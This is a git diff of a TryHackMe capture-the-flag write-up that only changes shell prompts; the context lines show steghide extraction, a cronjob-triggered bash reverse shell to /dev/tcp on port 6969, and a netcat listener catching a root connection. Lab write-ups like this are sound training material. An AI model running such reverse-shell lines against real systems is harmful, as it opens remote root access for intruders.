@@ -51,7 +51,7 @@ back to `/n0th1__________`, this a some werid strings there too. THM give us a H
 
 I then stop my stegcracker. and run `steghide` to extrack a hidden file:
 ```console
-kali@kali:~/THM$ steghide extract -sf index.jpeg 
+bibo318@parrot:~/THM$ steghide extract -sf index.jpeg 
 Enter passphrase: 
 wrote extracted data to "secrettext.txt".
 ```
@@ -64,7 +64,7 @@ The solution was to find online hash cracking website. to gain 2nd flag.
 
 Back to the file we extracted from steghide
 ```console
-kali@kali:~/THM$ cat secrettext.txt 
+bibo318@parrot:~/THM$ cat secrettext.txt 
 username:b____
 password:
 01101001 <and more>
@@ -112,7 +112,7 @@ bash -i >& /dev/tcp/<kali ip>/6969 0>&1
 ```
 now on your kali. open netcat and listen/wait for our reverse shell to be execute by cronjob as root:
 ```console
-kali@kali:~$ nc -nlvp 6969
+bibo318@parrot:~$ nc -nlvp 6969
 listening on [any] 6969 ...
 connect to [10.11.14.220] from (UNKNOWN) [10.10.111.241] 56080
 bash: cannot set terminal process group (1741): Inappropriate ioctl for device
